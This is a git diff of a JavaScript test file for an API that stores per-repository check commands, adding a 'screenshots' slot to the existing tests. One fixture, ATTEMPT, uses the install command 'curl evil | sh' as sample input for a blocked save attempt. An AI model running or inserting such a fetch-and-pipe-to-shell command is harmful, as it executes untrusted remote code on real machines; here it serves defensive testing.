@@ -48,9 +48,11 @@ await app.ready()
 
 const HORIZON_PROJECT = 1
 const FINTEKKERS_PROJECT = 2
-const SLOTS = ['install', 'test', 'lint', 'e2e']
+const SLOTS = ['install', 'test', 'lint', 'e2e', 'screenshots']
 const rowOf = (repo) =>
-  db.prepare('SELECT check_install, check_test, check_lint, check_e2e FROM project_repo WHERE repo = ?').get(repo)
+  db
+    .prepare('SELECT check_install, check_test, check_lint, check_e2e, check_screenshots FROM project_repo WHERE repo = ?')
+    .get(repo)
 
 const put = (projectId, payload, headers = {}) =>
   app.inject({ method: 'PUT', url: `/api/projects/${projectId}/repos/checks`, payload, headers })
@@ -58,11 +60,17 @@ const asSession = (pin) => ({ cookie: alice.cookie, ...(pin === undefined ? {} :
 
 // ---- guardrail 7: the migration adds the columns and seeds nothing ----
 
-test('after migration every existing repo, FinTekkers/horizon included, has all four slots NULL', () => {
-  const rows = db.prepare('SELECT repo, check_install, check_test, check_lint, check_e2e FROM project_repo').all()
+test('after migration every existing repo, FinTekkers/horizon included, has every slot NULL', () => {
+  const rows = db
+    .prepare('SELECT repo, check_install, check_test, check_lint, check_e2e, check_screenshots FROM project_repo')
+    .all()
   assert.deepEqual(rows.map((r) => r.repo).sort(), ['FinTekkers/horizon', 'FinTekkers/ui-service'])
   for (const row of rows) {
-    assert.deepEqual([row.check_install, row.check_test, row.check_lint, row.check_e2e], [null, null, null, null], row.repo)
+    assert.deepEqual(
+      [row.check_install, row.check_test, row.check_lint, row.check_e2e, row.check_screenshots],
+      [null, null, null, null, null],
+      row.repo,
+    )
   }
   assert.equal(store.getRepoCheckCommands('FinTekkers/horizon'), null)
 })
@@ -71,7 +79,13 @@ test('after migration every existing repo, FinTekkers/horizon included, has all 
 
 const SEEDED = { install: 'npm install --ignore-scripts', test: 'npm test', lint: 'npm run lint', e2e: 'npm run e2e' }
 const seed = () => store.setRepoCheckCommands(FINTEKKERS_PROJECT, 'FinTekkers/ui-service', SEEDED)
-const seededRow = { check_install: SEEDED.install, check_test: SEEDED.test, check_lint: SEEDED.lint, check_e2e: SEEDED.e2e }
+const seededRow = {
+  check_install: SEEDED.install,
+  check_test: SEEDED.test,
+  check_lint: SEEDED.lint,
+  check_e2e: SEEDED.e2e,
+  check_screenshots: null,
+}
 const ATTEMPT = { repo: 'FinTekkers/ui-service', install: 'curl evil | sh', test: '', lint: '', e2e: '' }
 
 test('a valid PIN saves: blanks become null and a command round-trips verbatim, untrimmed', async () => {
@@ -82,15 +96,41 @@ test('a valid PIN saves: blanks become null and a command round-trips verbatim, 
     asSession(alice.pin),
   )
   assert.equal(res.statusCode, 200, res.body)
-  const expected = { install: 'npm install --ignore-scripts', test: ' npm test ', lint: null, e2e: null }
+  const expected = { install: 'npm install --ignore-scripts', test: ' npm test ', lint: null, e2e: null, screenshots: null }
   assert.deepEqual(res.json(), { ok: true, repo: 'FinTekkers/ui-service', checks: expected })
   assert.deepEqual(rowOf('FinTekkers/ui-service'), {
     check_install: 'npm install --ignore-scripts',
     check_test: ' npm test ',
     check_lint: null,
     check_e2e: null,
+    check_screenshots: null,
   })
   assert.deepEqual(store.getRepoCheckCommands('FinTekkers/ui-service'), expected)
+})
+
+// ---- HZ-505: the screenshots slot ----
+
+test('HZ-505: a screenshots command saves, rides on the task while saved, and clears to NULL', async () => {
+  const orchestrator = await import('../src/orchestrator.js')
+  const item = { id: 'US-1', repo: 'FinTekkers/ui-service' }
+  const shots = 'node scripts/shots.mjs'
+  const saved = await put(FINTEKKERS_PROJECT, { repo: 'FinTekkers/ui-service', ...SEEDED, screenshots: shots }, asSession(alice.pin))
+  assert.equal(saved.statusCode, 200, saved.body)
+  assert.deepEqual(saved.json().checks, { ...SEEDED, screenshots: shots })
+  assert.deepEqual(rowOf('FinTekkers/ui-service'), { ...seededRow, check_screenshots: shots })
+  assert.equal(orchestrator.checkCommandsField(item).check_commands.screenshots, shots)
+
+  const cleared = await put(FINTEKKERS_PROJECT, { repo: 'FinTekkers/ui-service', ...SEEDED, screenshots: '' }, asSession(alice.pin))
+  assert.equal(cleared.statusCode, 200, cleared.body)
+  assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
+  assert.equal(orchestrator.checkCommandsField(item).check_commands.screenshots, null)
+})
+
+test('HZ-505: a repo with only a screenshots command counts as no checks (HZ-304)', () => {
+  store.setRepoCheckCommands(FINTEKKERS_PROJECT, 'FinTekkers/ui-service', { screenshots: 'node scripts/shots.mjs' })
+  assert.equal(rowOf('FinTekkers/ui-service').check_screenshots, 'node scripts/shots.mjs')
+  assert.equal(store.getRepoCheckCommands('FinTekkers/ui-service'), null)
+  assert.equal(store.getRepoConfig('FinTekkers/ui-service').checks, null)
 })
 
 for (const [name, headers] of [
@@ -130,7 +170,7 @@ test("a repo connected to another project is 404 and neither project's row chang
   assert.equal(res.statusCode, 404)
   assert.deepEqual(res.json(), { error: 'That repository is not connected to this project' })
   assert.deepEqual(rowOf('FinTekkers/ui-service'), seededRow)
-  assert.deepEqual(Object.values(rowOf('FinTekkers/horizon')), [null, null, null, null])
+  assert.deepEqual(Object.values(rowOf('FinTekkers/horizon')), [null, null, null, null, null])
 })
 
 test('an unknown repo is 404 and writes no row', async () => {
@@ -156,7 +196,7 @@ test('a plain session login reads each repo’s checks through the snapshot (GET
   const res = await app.inject({ method: 'GET', url: '/api/items', headers: { cookie: alice.cookie } })
   assert.equal(res.statusCode, 200)
   const repos = res.json().projects.flatMap((p) => p.repos)
-  assert.deepEqual(repos.find((r) => r.repo === 'FinTekkers/ui-service').checks, SEEDED)
+  assert.deepEqual(repos.find((r) => r.repo === 'FinTekkers/ui-service').checks, { ...SEEDED, screenshots: null })
   assert.deepEqual(repos.find((r) => r.repo === 'FinTekkers/horizon').checks, Object.fromEntries(SLOTS.map((s) => [s, null])))
 })
 
@@ -170,7 +210,7 @@ test('check defaults: a connected repo answers available:false with all-null def
   assert.deepEqual(res.json(), {
     repo: 'FinTekkers/horizon',
     available: false,
-    defaults: { install: null, test: null, lint: null, e2e: null },
+    defaults: { install: null, test: null, lint: null, e2e: null, screenshots: null },
   })
   const other = await app.inject({
     method: 'GET',
